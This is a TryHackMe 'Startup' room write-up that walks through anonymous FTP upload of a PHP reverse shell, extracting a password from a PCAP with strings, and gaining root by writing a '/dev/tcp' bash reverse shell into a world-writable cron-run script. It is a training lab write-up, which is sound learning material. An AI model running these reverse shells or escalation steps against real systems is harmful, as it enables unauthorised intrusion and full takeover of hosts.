# TryHackMe — Startup Room Writeup

> **Platform:** TryHackMe  
> **Room:** Startup  
> **Difficulty:** Easy  
> **Attack Vectors:** FTP Anonymous Login → PHP Reverse Shell → Privilege Escalation  
> **Flags Found:** 3 / 3  

---

## Table of Contents
1. [Overview](#1-overview)
2. [Tools Used](#2-tools-used)
3. [Reconnaissance](#3-reconnaissance)
4. [Initial Access — Reverse Shell](#4-initial-access--reverse-shell)
5. [Flag 1 — The Secret Recipe](#5-flag-1--the-secret-recipe)
6. [Flag 2 — User Flag](#6-flag-2--user-flag)
7. [Flag 3 — Root Flag](#7-flag-3--root-flag-privilege-escalation)
8. [Lessons Learned](#8-lessons-learned)
9. [Attack Chain Summary](#9-attack-chain-summary)

---

## 1. Overview

This room simulates a startup company web server with a misconfigured FTP service and a writable web directory. The objective was to find a hidden recipe, locate a user flag, and escalate privileges to root.

---

## 2. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port and service enumeration |
| `ftp` | Anonymous FTP login and file retrieval |
| `gobuster` | Web directory brute-forcing |
| `netcat (nc)` | Reverse shell listener |
| `python3` | TTY shell stabilization |
| `ssh` | Remote login with discovered credentials |
| `strings` | Extracting readable text from binary PCAP file |

---

## 3. Reconnaissance

### 3.1 Nmap Scan

An initial nmap scan was run to identify open ports and services on the target.

```bash
$ nmap -vv -p 20,21,80,8080 <TARGET_IP>

PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
80/tcp   open   http
8080/tcp closed http-proxy
```

**Key findings:** FTP (port 21) and HTTP (port 80) were open, which guided the next phase of enumeration.

---

### 3.2 FTP Enumeration

FTP allowed anonymous login, granting access to the server's file root. The following files were discovered and downloaded:

```bash
$ ftp <TARGET_IP>
Name: anonymous
Password: (blank)

ftp> ls -la
drwxrwxrwx  ftp/
-rw-r--r--  important.jpg
-rw-r--r--  notice.txt
-rw-r--r--  .test.log

ftp> get notice.txt
ftp> get important.jpg
ftp> get .test.log
```

**Observations:**

| File | Finding |
|------|---------|
| `notice.txt` | Message from server admin — no actionable info |
| `important.jpg` | Checked with exiftool — no embedded data |
| `.test.log` | Hidden log file — contents not significant |
| `ftp/` directory | **World-writable (drwxrwxrwx)** — critical misconfiguration |

> ⚠️ **Key Finding:** The `ftp/` directory had 777 permissions, meaning any user — including anonymous — could upload files into it.

---

### 3.3 Web Enumeration (Gobuster)

Gobuster was run against the HTTP service to discover hidden directories.

```bash
$ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

/files   (Status: 301)
```

The `/files` directory on the web server mapped directly to the FTP root. This confirmed that any file uploaded via FTP would be accessible and executable via the browser.

---

## 4. Initial Access — Reverse Shell

### 4.1 Crafting the PHP Payload

A PHP reverse shell payload was prepared and edited with the attacker's IP and chosen port.

```
Payload: php-reverse-shell.php (from /usr/share/webshells/php/)

Edit the following variables:
  $ip   = '<ATTACKER_IP>';   // Verify with: ip a (look for tun0)
  $port = 9001;
```

> ⚠️ **Common Mistake:** Always double-check your attacker IP before uploading. The wrong IP will result in no connection.

---

### 4.2 Uploading the Payload via FTP

```bash
ftp> cd ftp
ftp> put php-reverse-shell.php
226 Transfer complete.
```

---

### 4.3 Starting the Listener and Triggering the Shell

```bash
# Start listener on attacker machine
$ nc -lnvp 9001

# Trigger payload by visiting in browser:
http://<TARGET_IP>/files/ftp/php-reverse-shell.php
```

A reverse shell connected back successfully as `www-data`.

---

### 4.4 Shell Stabilization

The initial shell lacked a proper TTY. It was upgraded using Python:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@startup:/$
```

> 💡 **Tip:** Always stabilize your shell after connecting. A raw shell can't handle `Ctrl+C`, tab completion, or interactive prompts like `sudo`.

---

## 5. Flag 1 — The Secret Recipe

After stabilizing the shell, the filesystem was explored to find the recipe file.

```bash
www-data@startup:/$ find / -name 'recipe.txt' 2>/dev/null
/recipe.txt

www-data@startup:/$ cat /recipe.txt
```

> 🚩 **Flag 1 — What is the secret of the recipe?**  
> `love`

---

## 6. Flag 2 — User Flag

### 6.1 Discovering Credentials in a PCAP File

While exploring the filesystem as `www-data`, an `/incidents` directory was found containing a network capture file.

```bash
www-data@startup:/$ ls /incidents
suspicious.pcapng

www-data@startup:/$ strings /incidents/suspicious.pcapng | grep -i password
[sudo] password for lennie: c4ntg3t3n0ughsp1c3
```

The `strings` command extracted readable text from the binary PCAP. A failed sudo attempt by user `lennie` exposed their password in plaintext.

> 💡 **Tip:** When Wireshark isn't available on the target, `strings` can extract readable content from any binary file including PCAPs.

---

### 6.2 SSH Login as Lennie

```bash
# Run from AttackBox — not from inside the reverse shell
$ ssh lennie@<TARGET_IP>
Password: c4ntg3t3n0ughsp1c3

lennie@startup:~$ cat user.txt
```

> 🚩 **Flag 2 — user.txt**  
> `[your flag value here]`

---

## 7. Flag 3 — Root Flag (Privilege Escalation)

### 7.1 Enumerating Lennie's Files

```bash
lennie@startup:~$ ls -la
drwxr-xr-x  Documents/
drwxr-xr-x  scripts/

lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

The `planner.sh` script calls `/etc/print.sh`. Checking its permissions:

```bash
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwxrwxrwx 1 root root 25 Nov 12 2020 /etc/print.sh
```

`/etc/print.sh` is owned by root but **world-writable**. If `planner.sh` runs as root (via a cronjob), modifying `print.sh` allows executing arbitrary commands as root.

---

### 7.2 Exploiting the Writable Script

A reverse shell payload was written into `/etc/print.sh` and a new listener was started.

```bash
lennie@startup:~$ cat > /etc/print.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/9002 0>&1
EOF

# Start new listener on attacker machine
$ nc -lnvp 9002
```

After a short wait, the cronjob executed `planner.sh` as root, which called the modified `print.sh`, and a root shell was received.

---

### 7.3 Reading the Root Flag

```bash
root@startup:~# cat /root/root.txt
```

> 🚩 **Flag 3 — root.txt**  
> `[your flag value here]`

---

## 8. Lessons Learned

### Vulnerabilities Identified

| Vulnerability | Impact |
|--------------|--------|
| Anonymous FTP with world-writable directory | Allowed upload of a malicious web shell |
| Web server serving the FTP directory | Made uploaded payload directly executable |
| Credentials captured in unencrypted PCAP | Exposed SSH password for user `lennie` |
| World-writable script executed by root cronjob | Enabled full privilege escalation to root |

### Personal Takeaways

- Always verify the attacker IP in reverse shell payloads before uploading — wrong IP means no connection
- Use `strings` on binary files when proper tools like Wireshark aren't available on the target
- Check file permissions carefully — world-writable files owned by root are a major escalation vector
- SSH from your own machine, not from within a reverse shell session, to avoid connectivity issues
- Stabilize your shell immediately after getting RCE using the `python3 pty` technique

---

## 9. Attack Chain Summary

| Step | Action |
|------|--------|
| 1. Recon | nmap scan revealed open FTP (21) and HTTP (80) |
| 2. FTP Enum | Anonymous login; discovered world-writable `ftp/` directory |
| 3. Web Enum | Gobuster confirmed `/files` maps to FTP root |
| 4. Upload Shell | PHP reverse shell uploaded via FTP |
| 5. RCE | Triggered payload via browser; shell received as `www-data` |
| 6. Flag 1 | Found and read `/recipe.txt` |
| 7. Cred Discovery | Extracted `lennie`'s password from PCAP via `strings` |
| 8. SSH Login | SSHd into target as `lennie` |
| 9. Flag 2 | Read `/home/lennie/user.txt` |
| 10. PrivEsc | Modified `/etc/print.sh` called by root cronjob |
| 11. Flag 3 | Root shell obtained; read `/root/root.txt` |

---

*Writeup by [your name/handle] | TryHackMe: [your profile link]*
